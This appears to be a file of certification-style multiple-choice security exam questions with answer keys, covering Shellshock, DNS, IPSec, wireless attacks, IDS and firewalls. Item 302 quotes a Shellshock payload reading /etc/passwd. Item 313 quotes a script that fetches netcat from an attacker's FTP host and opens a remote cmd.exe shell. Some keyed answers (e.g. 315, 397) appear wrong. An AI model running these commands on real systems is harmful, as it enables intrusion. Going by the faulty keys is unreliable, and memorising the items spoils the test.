+"299. Windows file servers commonly hold sensitive files, databases, passwords and more. Which of the following choices would be a common vulnerability that usually exposes them?
+A. Cross-site scripting
+B. SQL injection
+C. Missing patches
+D. CRLF injection
+","C
+",299
+"300. At a Windows Server command prompt, which command could be used to list the running services?
+A. Sc query type= running
+B. Sc query \\\\servername
+C. Sc query
+D. Sc config
+","C
+",300
+"301. What is the most common method to exploit the “Bash Bug” or “ShellShock” vulnerability?
+A. SSH
+B. SYN Flood
+C. Through web servers utilizing CGI (Common Gateway Interface) to send a malformed environment variable to a vulnerable Web server
+D. Manipulate format strings in text fields
+","C
+",301
+"302. env x=`(){ :;};echo exploit` bash -c ‘cat /etc/passwd’
+What is the Shellshock bash vulnerability attempting to do on an vulnerable Linux host?
+Display passwd content to prompt
+Changes all passwords in passwd
+Removes the passwd file
+Add new user to the passwd file
+","Display passwd content to prompt
+",302
+"303. Shellshock had the potential for an unauthorized user to gain access to a server. It affected many internet facing services, which OS did it not directly affect?
+A. Windows
+B. Unix
+C. Linux
+D. OS X
+","A
+",303
+"304. Which of the following is a vulnerability in GNU’s bash shell (discovered in September of 2014) that gives attackers access to run remote commands on a vulnerable system? The malicious software can take control of an infected machine, launch denial-of-service attacks to disrupt websites, and scan for other vulnerable devices (including routers).
+A. Shellshock
+B. Rootshell
+C. Rootshock
+D. Shellbash
+","A
+",304
+"305. How can telnet be used to fingerprint a web server?
+A. telnet webserverAddress 80
+HEAD / HTTP/1.0
+B. telnet webserverAddress 80
+PUT / HTTP/1.0
+C. telnet webserverAddress 80
+HEAD / HTTP/2.0
+D. telnet webserverAddress 80
+PUT / HTTP/2.0
+","A
+",305
+"306. invictus@victim_server:~$ nmap -T4 -0 10.10.0.0/24
+TCP/IP fingerprinting (for OS scan) xxxxxxx xxxxxx xxxxxxxxx. QUITTING!
+Obviously, it is not going through. What is the issue here?
+A. OS Scan requires root privileges
+B. The nmap syntax is wrong.
+C. The outgoing TCP/IP fingerprinting is blocked by the host firewall
+D. This is a common behavior for a corrupted nmap application
+","A
+",306
+"307. What type of OS fingerprinting technique sends specially crafted packets to the remote OS and analyzes the received response?
+A. Passive
+B. Distributive
+C. Reflective
+D. Active
+","D
+",307
+"308. Which of the following types of jailbreaking allows user-level access but does not allow iboot-level access?
+A. Bootrom Exploit
+B. iBoot Exploit
+C. Sandbox Exploit
+D. Userland Exploit
+","D
+",308
+"309. An attacker uses a communication channel within an operating system that is neither designed nor intended to transfer information. What is the name of the communications channel?
+A. Classified
+B. Overt
+C. Encrypted
+D. Covert
+","D
+",309
+"310. One way to defeat a multi-level security solution is to leak data via
+A. a bypass regulator.
+B. steganography.
+C. a covert channel.
+D. asymmetric routing.
+","C
+",310
+"311. A covert channel is a channel that
+A. transfers information over, within a computer system, or network that is outside of the security policy.
+B. transfers information over, within a computer system, or network that is within the security policy.
+C. transfers information via a communication path within a computer system, or network for transfer of data.
+D. transfers information over, within a computer system, or network that is encrypted.
+","A
+",311
+"349. Which of the following is a wireless network detector that is commonly found on Linux?
+A. Kismet
+B. Abel
+C. Netstumbler
+D. Nessus
+","A
+",349
+"350. Which of the following is a passive wireless packet analyzer that works on Linux-based systems?
+A. Burp Suite
+B. OpenVAS
+C. tshark
+D. Kismet
+","D
+",350
+"312. An organization hires a tester to do a wireless penetration test. Previous reports indicate that the last test did not contain management or control packets in the submitted traces. Which of the following is the most likely reason for lack of management or control packets?
+A. The wireless card was not turned on.
+B. The wrong network card drivers were in use by Wireshark.
+C. On Linux and Mac OS X, only 802.11 headers are received in promiscuous mode.
+D. Certain operating systems and adapters do not collect the management or control packets.
+","D
+",312
+"313. A tester has been using the msadc.pl attack script to execute arbitrary commands on a Windows NT4 web server. While it is effective, the tester finds it tedious to perform extended functions. On further research, the tester come across a perl script that runs the following msadc functions:
+system(“perl msadc.pl -h $host -C \\”echo open $your >testfile\\””);
+system(“perl msadc.pl -h $host -C \\”echo $user>>testfile\\””);
+system(“perl msadc.pl -h $host -C \\”echo $pass>>testfile\\””);
+system(“perl msadc.pl -h $host -C \\”echo bin>>testfile\\””);
+system(“perl msadc.pl -h $host -C \\”echo get nc.exe>>testfile
+system(“perl msadc.pl -h $host -C \\”echo get hacked.html>>testfile
+(“perl msadc.pl -h $host -C \\”echo quit>>testfile\\””);
+system(“perl msadc.pl -h $host -C \\”ftp \\-s\\:testfile\\””);
+$o=; print “Opening …\\n”;
+system(“perl msadc.pl -h $host -C \\”nc -l -p $port -e cmd.exe\\””);
+Which exploit is indicated by this script?
+A. A buffer overflow exploit
+B. A chained exploit
+C. A SQL injection exploit
+D. A denial of service exploit
+","B
+",313
+"314. How can a rootkit bypass Windows 7 operating system’s kernel mode, code signing policy?
+A. Defeating the scanner from detecting any code change at the kernel
+B. Replacing patch system calls with its own version that hides the rootkit (attacker’s) actions
+C. Performing common services for the application process and replacing real applications with fake ones
+D. Attaching itself to the master boot record in a hard drive and changing the machine’s boot sequence/options
+","D
+",314
+"315. What mechanism in Windows prevents a user from accidentally executing a potentially malicious batch (.bat) or PowerShell (.ps1) script?
+A. User Access Control (UAC)
+B. Data Execution Prevention (DEP)
+C. Address Space Layout Randomization (ASLR)
+D. Windows firewall
+","B
+",315
+"316. A network administrator discovers several unknown files in the root directory of his Linux FTP server. One of the files is a tarball, two are shell script files, and the third is a binary file is named “”nc.”” The FTP server’s access logs show that the anonymous user account logged in to the server, uploaded the files, and extracted the contents of the tarball and ran the script using a function provided by the FTP server’s software. The ps command shows that the nc file is running as process, and the netstat command shows the nc process is listening on a network port.
+What kind of vulnerability must be present to make this remote attack possible?
+File system permissions
+Privilege escalation
+Brute force login
+Directory traversal
+","File system permissions
+",316
+"317. An attacker with access to the inside network of a small company launches a successful STP manipulation attack. What will he do next?
+He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer.
+He will repeat the same attack against all L2 switches of the network.
+He will activate OSPF on the spoofed root bridge.
+He will repeat this action so that it escalates to a DoS attack.
+","He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer.
+",317
+"318. It is a widely used standard for message logging. It permits separation of the software that generates messages, the system that stores them, and the software that reports and analyzes them. This protocol is specifically designed for transporting event messages. Which of the following is being described?
+A. SNMP
+B. ICMP
+C. SYSLOG
+D. SMS
+","C
+",318
+"319. Which among the following is a Windows command that a hacker can use to list all the shares to which the current user context has access?
+A. NET FILE
+B. NET USE
+C. NET CONFIG
+D. NET VIEW
+","B
+",319
+"320. Which system consists of a publicly available set of databases that contain domain name registration contact information?
+A. CAPTCHA
+B. IETF
+C. WHOIS
+D. IANA
+","C
+",320
+"321. During a recent security assessment, you discover the organization has one Domain Name Server (DNS) in a Demilitarized Zone (DMZ) and a second DNS server on the internal network. What is this type of DNS configuration commonly called?
+A. Split DNS
+B. DNSSEC
+C. DynDNS
+D. DNS Scheme
+","A
+",321
+"322. A hacker is attempting to use nslookup to query Domain Name Service (DNS). The hacker uses the nslookup interactive mode for the search. Which command should the hacker type into the command shell to request the appropriate records?
+A. Locate type=ns
+B. Request type=ns
+C. Set type=ns
+D. Transfer type=ns
+","C
+",322
+"323. ___________ Is a set of extensions to DNS that provide to DNS clients (resolvers) origin authentication of DNS data to reduce the threat of DNS poisoning, spoofing, and similar attacks types.
+DNSSEC
+Resource records
+Zone transfer
+Resource transfer
+","DNSSEC
+",323
+"324. Some clients of TPNQM SA were redirected to a malicious site when they tried to access the TPNQM main site. Bob, a system administrator at TPNQM SA, found that they were victims of DNS Cache Poisoning. What should Bob recommend to deal with such a threat
+The use of DNSSEC
+Client awareness
+The use of double-factor authentication
+The use of security agents in clients computers
+","The use of DNSSEC
+",324
+"325. What is the purpose of a demilitarized zone on a network
+To provide a place to put the honeypot
+To only provide direct access to the nodes within the DMZ and protect the network behind it
+To scan all traffic coming through the DMZ to the internal network
+To contain the network devices you wish to protect
+","To only provide direct access to the nodes within the DMZ and protect the network behind it
+",325
+"326. Bob, a system administrator at TPNQM SA, concluded one day that a DMZ is not needed if he properly configures the firewall to allow access just to servers ports, which can have direct internet access, and block the access to workstations. Bob also concluded that DMZ makes sense just when a stateful firewall is available, which is not the case of TPNQM SA.
+In this context, what can you say
+A. Bob can be right since DMZ does not make sense when combined with stateless firewalls.
+B. Bob is totally wrong. DMZ is always relevant when the company has internet servers and workstations.
+C. Bob is partially right. DMZ does not make sense when a stateless firewall is available.
+D. Bob is partially right. He does not need to separate networks if he can create rules by destination IPs, one by one.
+","B
+",326
+"351. Which of the following network attacks relies on sending an abnormally large packet size that exceeds TCP/IP specifications?
+A. Ping of death
+B. SYN flooding
+C. TCP hijacking
+D. Smurf attack
+","A
+",351
+"327. A company firewall engineer has configured a new DMZ to allow public systems to be located away from the internal network. The engineer has three security zones set:
+Untrust (Internet) – (Remote network = 217.77.88.0/24)
+DMZ (DMZ) – (11.12.13.0/24)
+Trust (Intranet) – (192.168.0.0/24)
+The engineer wants to configure remote desktop access from a fixed IP on the remote network to a remote desktop server in the DMZ.
+Which rule would best fit this requirement?
+A. Permit 217.77.88.0/24 11.12.13.0/24 RDP 3389
+B. Permit 217.77.88.12 11.12.13.50 RDP 3389
+C. Permit 217.77.88.12 11.12.13.0/24 RDP 3389
+D. Permit 217.77.88.0/24 11.12.13.50 RDP 3389
+","B
+",327
+"328. A regional bank hires your company to perform a security assessment on their network after a recent data breach. The attacker was able to steal financial data from the bank by compromising only a single server.
+Based on this information, what should be one of your key recommendations to the bank?
+Place a front-end web server in a demilitarized zone that only handles external web traffic
+Require all employees to change their anti-virus program with a new one.
+Issue new certificates to the web servers from the root certificate authority
+Move the financial data to another server on the same IP subnet
+","Place a front-end web server in a demilitarized zone that only handles external web traffic
+",328
+"329. In both pharming and phishing attacks an attacker can create websites that look similar to legitimate sites with the intent of collecting personal identifiable information from its victims. What is the difference between pharming and phishing attacks?
+A. Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
+B. In a pharming attack a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
+C. Both pharming and phishing attacks are identical
+D. In a phishing attack a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name.
+","B
+",329
+"330. An attacker has installed a RAT on a host. The attacker wants to ensure that when a user attempts to go to http://www.MyPersonalBank.com, the user is directed to a phishing site.
+Which file does the attacker need to modify
+Hosts
+Boot.ini
+Sudoers
+Networks
+","Hosts
+",330
+"331. A security engineer has been asked to deploy a secure remote access solution that will allow employees to connect to the company’s internal network. Which of the following can be implemented to minimize the opportunity for the man-in-the-middle attack to occur?
+A. SSL
+B. Mutual authentication
+C. IPSec
+D. Static IP addresses
+","C
+",331
+"332. When security and confidentiality of data within the same LAN is of utmost priority, which IPSec mode should you implement?
+A. AH Tunnel mode
+B. AH promiscuous
+C. ESP transport mode
+D. ESP confidential
+","C
+",332
+"333. Which component of IPsec performs protocol-level functions that are required to encrypt and decrypt the packets?
+","Internet Key Exchange (IKE)
+",333
+"334. Internet Protocol Security IPSec is actually a suite of protocols. Each protocol within the suite provides different functionality. Collective IPSec does everything except.
+A. Protect the payload and the headers
+B. Authenticate
+C. Encrypt
+D. Work at the Data Link Layer
+","D
+",334
+"335. Which protocol is used for setting up secured channels between two devices, typically in VPNs?
+A. IPSEC
+B. PEM
+C. SET
+D. PPP
+","A
+",335
+"336. The use of technologies like IPSec can help guarantee the following: authenticity, integrity, confidentiality and
+A. non-repudiation.
+B. operability.
+C. security.
+D. usability.
+","A
+",336
+"337. In IPv6 what is the major difference concerning application layer vulnerabilities compared to IPv4?
+Vulnerabilities in the application layer are independent of the network layer. Attacks and mitigation techniques are almost identical.
+Implementing IPv4 security in a dual-stack network offers protection from IPv6 atttacks too.
+Vulnerabilities in the application layer are greatly different from IPv4
+Due to the extensive security measures built in IPv6, application layer vulnerabilities need not be addressed
+","Vulnerabilities in the application layer are independent of the network layer. Attacks and mitigation techniques are almost identical.
+",337
+"338. Which of these is capable of search for and locating rogue access points?
+HIDS
+WIPS
+NIDS
+WISS
+","WIPS
+",338
+"339. Supposed you are the Chief Network Engineer of a certain Telco. Your company is planning for a big business expansion and it requires that your network authenticate users connecting using analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relaynetwork. Which AAA protocol would you implement?
+A. TACACS+
+B. DIAMETER
+C. Kerberos
+D. RADIUS
+","D
+",339
+"340. Which of the following security policies defines the use of VPN for gaining access to an internal corporate network?
+A. Network security policy
+B. Remote access policy
+C. Information protection policy
+D. Access control policy
+","B
+",340
+"341. A security analyst is performing an audit on the network to determine if there are any deviations from the security policies in place. The analyst discovers that a user from the IT department had a dial-out modem installed. Which security policy must the security analyst check to see if dial-out modems are allowed?
+A. Acceptable-use policy
+B. Firewall-management policy
+C. Remote-access policy
+D. Permissive policy
+","C
+",341
+"342. Which tool would be used to collect wireless packet data?
+A. NetStumbler
+B. John the Ripper
+C. Nessus
+D. Netcat
+","A
+",342
+"343. Smart cards use which protocol to transfer the certificate in a secure manner?
+A. Extensible Authentication Protocol (EAP)
+B. Point to Point Protocol (PPP)
+C. Point to Point Tunneling Protocol (PPTP)
+D. Layer 2 Tunneling Protocol (L2TP)
+","A
+",343
+"344. In order to have an anonymous Internet surf, which of the following is best choice?
+Use Tor network with multi-node (connect virtual tunnels, not direct connection)
+Use SSL sites when entering personal information
+Use shared WiFi
+Use public VPN
+","Use Tor network with multi-node (connect virtual tunnels, not direct connection)
+",344
+"345. Bluetooth uses which digital modulation technique to exchange information between paired devices?
+A. PSK (phase-shift keying)
+B. FSK (frequency-shift keying)
+C. ASK (amplitude-shift keying)
+D. QAM (quadrature amplitude modulation)
+","A
+",345
+"346. Which of the following Bluetooth hacking techniques does an attacker use to send messages to users without the recipient’s consent, similar to email spamming?
+A. Bluesmacking
+B. Bluesniffing
+C. Bluesnarfing
+D. Bluejacking
+","D
+",346
+"410. Which service in a PKI will vouch for the identity of an individual or company?
+A. KDC
+B. CA
+C. CR
+D. CBC
+","B
+",410
+"352. Which of the following network attacks takes advantage of weaknesses in the fragment reassembly functionality of the TCP/IP protocol stack?
+A. Teardrop
+B. SYN flood
+C. Smurf attack
+D. Ping of death
+","A
+",352
+"353. A new wireless client that is 802.11 compliant cannot connect to a wireless network given that the client can see the network and it has compatible hardware and software installed. Upon further tests and investigation it was found out that the Wireless Access Point (WAP) was not responding to the association requests being sent by the wireless client. What MOST likely is the issue on this scenario?
+A. The client cannot see the SSID of the wireless network
+B. The WAP does not recognize the client’s MAC address.
+C. The wireless client is not configured to use DHCP.
+D. Client is configured for the wrong channel
+","B
+",353
+"354. WPA2 uses AES for wireless data encryption at which of the following encryption levels?
+A. 64 bit and CCMP
+B. 128 bit and CRC
+C. 128 bit and CCMP
+D. 128 bit and TKIP
+","C
+",354
+"355. During a wireless penetration test, a tester detects an access point using WPA2 encryption. Which of the following attacks should be used to obtain the key?
+A. The tester must capture the WPA2 authentication handshake and then crack it.
+B. The tester must use the tool inSSIDer to crack it using the ESSID of the network.
+C. The tester cannot crack WPA2 because it is in full compliance with the IEEE 802.11i standard.
+D. The tester must change the MAC address of the wireless network card and then use the AirTraf tool to obtain the key.
+","A
+",355
+"356. Which of the following BEST describes how Address Resolution Protocol (ARP) works?
+A. It sends a reply packet for a specific IP, asking for the MAC address
+B. It sends a reply packet to all the network elements, asking for the MAC address from a specific IP
+C. It sends a request packet to all the network elements, asking for the domain name from a specific IP
+D. It sends a request packet to all the network elements, asking for the MAC address from a specific IP
+","D
+",356
+"357. You’ve just discovered a server that is currently active within the same network with the machine you recently compromised. You ping it but it did not respond. 
+What could be the case?
+A. TCP/IP doesn’t support ICMP
+B. ARP is disabled on the target server
+C. ICMP could be disabled on the target server
+D. You need to run the ping command with root privileges
+","C
+",357
+"358. …….. is an attack type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises, but actually has been set up to eavesdrop on wireless communications. It is the wireless version of the phishing scam. An attacker fools wireless users into connecting a laptop or mobile phone to a tainted hotspot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a
+fraudulent web site and luring people there. Fill in the blank with appropriate choice.
+A. Collision Attack
+B. Evil Twin Attack
+C. Sinkhole Attack
+D. Signal Jamming Attack
+","B
+",358
+"359. This tool is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured. It implements the standard FMS attack along with some optimizations like KoreK attacks, as well as the PTW attack, thus making the attack much faster compared to other WEP cracking tools.
+Which of the following tools is being described?
+A. Aircrack-ng
+B. Airguard
+C. WLAN-crack
+D. wificracker
+","A
+",359
+"360. Which type of antenna is used in wireless communication?
+A. Omnidirectional
+B. Parabolic
+C. Uni-directional
+D. Bi-directional
+","A
+",360
+"361. Which of the following antennas is commonly used in communications for a frequency band of 10 MHz to VHF and UHF
+","Yagi
+",361
+"362. In 2007, this wireless security algorithm was rendered useless by capturing packets and discovering the passkey in a matter of seconds. This security flaw led to a network invasion of TJ Maxx and data theft through a technique known as wardriving. Which algorithm is this referring to?
+Wi-Fi Protected Access 2 (WPA2)
+Wired Equivalent Privacy (WEP)
+Wi-Fi Protected Access (WPA)
+Temporal Key Integrity Protocol (TKIP)
+","Wired Equivalent Privacy (WEP)
+",362
+"363. A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24. Which of the following has occurred?
+The computer is not using a private IP address
+The gateway and the computer are not on the same network
+The computer is using an invalid IP address
+The gateway is not routing to a public IP address
+","The gateway is not routing to a public IP address
+",363
+"364. Which of the following descriptions is true about a static NAT?
+A. A static NAT uses a many-to-many mapping.
+B. A static NAT uses a one-to-many mapping.
+C. A static NAT uses a many-to-one mapping.
+D. A static NAT uses a one-to-one mapping.
+","D
+",364
+"365. A penetration tester is attempting to scan an internal corporate network from the internet without alerting the border sensor. Which is the most efficient technique should the tester consider using?
+A. Spoofing an IP address
+B. Tunneling scan over SSH
+C. Tunneling over high port numbers
+D. Scanning using fragmented IP packets
+","B
+",365
+"366. DNS cache snooping is a process of determining if the specified resource address is present in the DNS cache records. It may be useful during the examination of the network to determine what software update resources are used, thus discovering what software is installed. What command is used to determine if the entry is present in DNS cache?
+","nslookup -norecursive update.antivirus.com
+",366
+"367. An attacker is trying to redirect the traffic of a small office. That office is using their own mail server, DNS server and NTP server because of the importance of their job. The attacker gain access to the DNS server and redirect the direction http://www.google.com to his own IP address. Now when the employees of the office wants to go to Google they are being redirected to the attacker machine. What is the name of this kind of attack?
+DNS spoofing (corrupted DNS data is introduced in cache, returning incorrect IP)
+Smurf Attack (DDoS, send large spoofed network packet directed towards victim IP)
+ARP Poisoning (Send ARP packet to change pairings in its IP to MAC address table)
+MAC Flooding (Flooding network switches with packets, to consume the limited)
+","DNS spoofing (corrupted DNS data is introduced in cache, returning incorrect IP)
+",367
+"368. From the following table, identify the wrong answer in terms of Range (ft).
+Standard Range (ft)
+802.11a 150-150
+802.11b 150-150
+802.11g 150-150
+802.16 (WiMax) 30 miles
+","802.11a 150-150
+",368
+"434. Which cipher encrypts the plain text digit (bit or byte) one by one?
+A. Classical cipher
+B. Block cipher
+C. Modern cipher
+D. Stream cipher
+","D
+",434
+"369. A large company intends to use Blackberry for corporate mobile phones and a security analyst is assigned to evaluate the possible threats. The analyst will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the corporate network. What tool should the analyst use to perform a Blackjacking attack?
+A. BBCrack
+B. Paros Proxy
+C. Blooover
+D. BBProxy
+","D
+",369
+"370. What is a successful method for protecting a router from potential smurf attacks?
+A. Placing the router in broadcast mode
+B. Enabling port forwarding on the router
+C. Installing the router outside of the network’s firewall
+D. Disabling the router from accepting broadcast ping messages
+","D
+",370
+"371. The security administrator of ABC needs to permit Internet traffic in the host 10.0.0.2 and UDP traffic in the host 10.0.0.3. Also he needs to permit all FTP traffic to the rest of the network and deny all other traffic. After he applied his ACL configuration in the router nobody can access to the ftp and the permitted hosts cannot access to the Internet. According to the next configuration what is happening in the network?
+access-list 102 deny tcp any any
+access-list 104 permit udp host 10.0.0.3 any
+access-list 110 permit tcp host 10.0.0.2 eq www any
+access-list 108 permit tcp any eq ftp any
+A. The ACL 110 needs to be changed to port 80
+B. The ACL for FTP must be before the ACL 110
+C. The first ACL is denying all TCP traffic and the other ACLs are being ignored by the router
+D. The ACL 104 needs to be first because is UDP
+","C
+",371
+"372. A recent security audit revealed that there were indeed several occasions that the company’s network was breached. After investigating, you discover that your IDS is not configured properly and therefore is unable to trigger alarms when needed. What type of alert is the IDS giving?
+A. True Positive
+B. False Negative
+C. False Positive
+D. False Positive
+","B
+",372
+"373. When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s Computer to update the router configuration. What type of an alert is this?
+True positive
+True negative
+False positive
+False negative
+","False positive
+",373
+"374. A network administrator received an administrative alert at 3:00 a.m. from the intrusion detection system. The alert was generated because a large number of packets were coming into the network over ports 20 and 21.
+During analysis, there were no signs of attack on the FTP servers. How should the administrator classify this situation?
+A. True negatives
+B. False negatives
+C. True positives
+D. False positives
+","D
+",374
+"375. When tuning security alerts, what is the best approach?
+Decrease False negatives
+Decrease the false positives
+Tune to avoid False positives and False Negatives
+Rise False positives Rise False Negatives
+","Tune to avoid False positives and False Negatives
+",375
+"376. Sam is working as a pen-tester in an organization in Houston. He performs penetration testing on IDS in order to find the different ways an attacker uses to evade the IDS. Sam sends a large amount of packets to the target IDS that generates alerts, which enable Sam to hide the real traffic. What type of method is Sam using to evade IDS?
+","False Positive Generation
+",376
+"377. Which type of intrusion detection system can monitor and alert on attacks, but cannot stop them?
+A. Detective
+B. Passive
+C. Intuitive
+D. Reactive
+","B
+",377
+"378. Which of the following options represents a conceptual characteristic of an anomaly-based IDS over a signature-based IDS?
+A. Produces less false positives
+B. Can identify unknown attacks
+C. Requires vendor updates for a new threat
+D. Cannot deal with encrypted network traffic
+","B
+",378
+"379. Which of the following does proper basic configuration of snort as a network intrusion detection system require?
+A. Limit the packets captured to the snort configuration file.
+B. Capture every packet on the network segment.
+C. Limit the packets captured to a single segment.
+D. Limit the packets captured to the /var/log/snort directory.
+","A
+",379
+"380. Which one of the following approaches is commonly used to automatically detect host intrusions?
+Network traffic analysis
+The host’s network interface use
+File checksums
+System CPU utilization (anything that widely deviates from the norm)
+","System CPU utilization (anything that widely deviates from the norm)
+",380
+"381. Which solution can be used to emulate computer services, such as mail and ftp, and to capture information related to logins or actions?
+A. Firewall
+B. Honeypot
+C. Core server
+D. Layer 4 switch
+","B
+",381
+"382. To maintain compliance with regulatory requirements, a security audit of the systems on a network must be performed to determine their compliance with security policies. Which of the following tools would MOST LIKELY be used to perform security audit on various of forms of network systems?
+A. Intrusion Detection System
+B. Vulnerability scanner
+C. Port scanner
+D. Protocol analyzer
+","B
+",382
+"383. Bob finished a C programming course and created a small C application to monitor the network traffic and produce alerts when any origin sends many IP packets, based on the average number of packets sent by all origins and using some thresholds.
+In concept, the solution developed by Bob is actually
+A behavior-based IDS
+A signature-based IDS
+Just a network monitoring tool
+A hybrid IDS
+","Just a network monitoring tool
+",383
+"384. Which of the statements concerning proxy firewalls is correct?
+A. Proxy firewalls increase the speed and functionality of a network.
+B. Firewall proxy servers decentralize all activity for an application.
+C. Proxy firewalls block network packets from passing to and from a protected network.
+D. Computers establish a connection with a proxy firewall which initiates a new network connection for the client.
+","D
+",384
+"385. Which of the following types of firewall inspects only header information in network traffic?
+A. Packet filter
+B. Stateful inspection
+C. Circuit-level gateway
+D. Application-level gateway
+","A
+",385
+"386. Which statement is TRUE regarding network firewalls preventing Web Application attacks?
+A. Network firewalls can prevent attacks because they can detect malicious HTTP traffic.
+B. Network firewalls cannot prevent attacks because ports 80 and 443 must be opened.
+C. Network firewalls can prevent attacks if they are properly configured.
+D. Network firewalls cannot prevent attacks because they are too complex to configure.
+","B
+",386
+"387. A pentester gains access to a Windows application server and needs to determine the settings of the built-in Windows firewall. Which command would be used?
+A. Netsh firewall show config
+B. WMIC firewall show config
+C. Net firewall show config
+D. Ipconfig firewall show config
+","A
+",387
+"435. An attacker has captured a target file that is encrypted with public key cryptography. Which of the attacks below is likely to be used to crack the target file?
+A. Timing attack
+B. Replay attack
+C. Memory trade-off attack
+D. Chosen plain-text attack
+","D
+",435
+"388. A possibly malicious sequence of packets that were sent to a web server has been captured by an Intrusion Detection System (IDS) and was saved to a PCAP file. As a network administrator, you need to determine whether these packets are indeed malicious. What tool are you going to use to determine if these packets are genuinely malicious or simply a false positive?
+A. Intrusion Prevention System (IPS)
+B. Vulnerability scanner
+C. Protocol analyzer
+D. Network sniffer
+","C
+",388
+"389. Which type of access control is used on a router or firewall to limit network activity?
+A. Mandatory
+B. Discretionary
+C. Rule-based
+D. Role-based
+","C
+",389
+"390. Which Intrusion Detection System is best applicable for large environments where critical assets on the network need extra security and is ideal for observing sensitive network segments?
+A. Network-based intrusion detection system (NIDS)
+B. Host-based intrusion detection system (HIDS)
+C. Firewalls
+D. Honeypots
+","A
+",390
+"391. The security concept of “separation of duties” is most similar to the operation of which type of security device?
+A. Firewall
+B. Bastion host
+C. Intrusion Detection System
+D. Honeypot
+","A
+",391
+"392. A penetration test was done at a company. After the test, a report was written and given to the company’s IT authorities. A section from the report is shown below:
+• Access List should be written between VLANs.
+• Port security should be enabled for the intranet.
+• A security solution which filters data packets should be set between intranet (LAN) and DMZ.
+• A WAF should be used in front of the web applications.
+According to the section from the report, which of the following choice is true?
+A stateful firewall can be used between intranet (LAN) and DMZ.
+MAC Spoof attacks cannot be performed.
+There is access control policy between VLANs.
+Possibility of SQL Injection attack is eliminated.
+","A stateful firewall can be used between intranet (LAN) and DMZ.
+",392
+"393. Employees in a company are no longer able to access Internet web sites on their computers. The network administrator is able to successfully ping IP address of web servers on the Internet and is able to open web sites by using an IP address in place of the URL. The administrator runs the nslookup command for http://www.eccouncil.org and receives an error message stating there is no response from the server. What should the administrator do next?
+A. Configure the firewall to allow traffic on TCP ports 53 and UDP port 53.
+B. Configure the firewall to allow traffic on TCP ports 80 and UDP port 443.
+C. Configure the firewall to allow traffic on TCP port 53.
+D. Configure the firewall to allow traffic on TCP port 8080.
+","A
+",393
+"394. Which of the following is a hardware requirement that either an IDS/IPS system or a proxy server must have in order to properly function?
+A. Fast processor to help with network traffic analysis
+B. They must be dual-homed
+C. Similar RAM requirements
+D. Fast network interface cards
+","B
+",394
+"395. Bob, a network administrator at BigUniversity, realized that some students are connecting their notebooks in the wired network to have Internet access. In the university campus, there are many Ethernet ports available for professors and authorized visitors but not for students. He identified this when the IDS alerted for malware activities in the network. What should Bob do to avoid this problem?
+Ask students to use the wireless network
+Use the 802.1x protocol
+Separate students in a different VLAN
+Disable unused ports in the switches
+","Use the 802.1x protocol
+",395
+"396. While conducting a penetration test, the tester determines that there is a firewall between the tester’s machine and the target machine. The firewall is only monitoring TCP handshaking of packets at the session layer of the OSI model. Which type of firewall is the tester trying to traverse?
+A. Packet filtering firewall
+B. Application-level firewall
+C. Circuit-level gateway firewall
+D. Stateful multilayer inspection firewall
+","C
+",396
+"397. A circuit level gateway works at which of the following layers of the OSI Model?
+A. Layer 5 – Application
+B. Layer 4 – TCP
+C. Layer 3 – Internet protocol
+D. Layer 2 – Data link
+","A
+",397
+"398. In the OSI model, where does PPTP encryption take place?
+A. Transport layer
+B. Application layer
+C. Data link layer
+D. Network layer
+","C
+",398
+"399. Which of the following types of firewalls ensures that the packets are part of the established session?
+A. Stateful inspection firewall (distinguish legitimate packets for different connections)
+B. Circuit-level firewall (monitor TCP handshaking)
+C. Application-level firewall (controls input/output)
+D. Switch-level firewall
+","A
+",399
+"400. You are the Systems Administrator for a large corporate organization. You need to monitor all network traffic on your local network for suspicious activities and receive notifications when an attack is occurring. Which tool would allow you to accomplish this goal?
+A. Network-based IDS
+B. Firewall
+C. Proxy
+D. Host-based IDS
+","A
+",400
+"401. An incident investigator asks to receive a copy of the event logs from all firewalls, proxy servers, and Intrusion Detection Systems (IDS) on the network of an organization that has experienced a possible breach of security. When the investigator attempts to correlate the information in all of the logs, the sequence of many of the logged events do not match up.
+What is the most likely cause?
+The security breach was a false positive.
+The attacker altered or erased events from the logs.
+The network devices are not all synchronized.
+Proper chain of custody was not observed while collecting the logs.
+","The network devices are not all synchronized.
+",401
+"402. Which security control role does encryption meet?
+A. Preventative
+B. Detective
+C. Offensive
+D. Defensive
+","A
+",402
+"403. Which of the following is the successor of SSL?
+A. TLS
+B. RSA
+C. GRE
+D. IPSec
+","A
+",403
+"404. Advanced encryption standard is an algorithm used for which of the following?
+A. Data integrity
+B. Key discovery
+C. Bulk data encryption
+D. Key recovery
+","C
+",404
+"405. Which type of cryptography does SSL, IKE and PGP belongs to?
+A. Secret Key
+B. Hash Algorithm
+C. Digest
+D. Public Key
+","D
+",405
+"406. Which of the following is a symmetric cryptographic standard?
+A. DSA
+B. PKI
+C. RSA
+D. 3DES
+","D
+",406
+"407. Which of the following is designed to verify and authenticate individuals taking part in a data exchange within an enterprise?
+A. SOA
+B. Single-Sign On
+C. PKI
+D. Biometrics
+","C
+",407
+"408. Which of the following is a characteristic of Public Key Infrastructure (PKI)?
+A. Public-key cryptosystems are faster than symmetric-key cryptosystems.
+B. Public-key cryptosystems distribute public-keys within digital signatures.
+C. Public-key cryptosystems do not require a secure key distribution channel.
+D. Public-key cryptosystems do not provide technical non-repudiation via digital signatures.
+","B
+",408
+"409. Which of the following levels of algorithms does Public Key Infrastructure (PKI) use?
+A. RSA 1024 bit strength
+B. AES 1024 bit strength
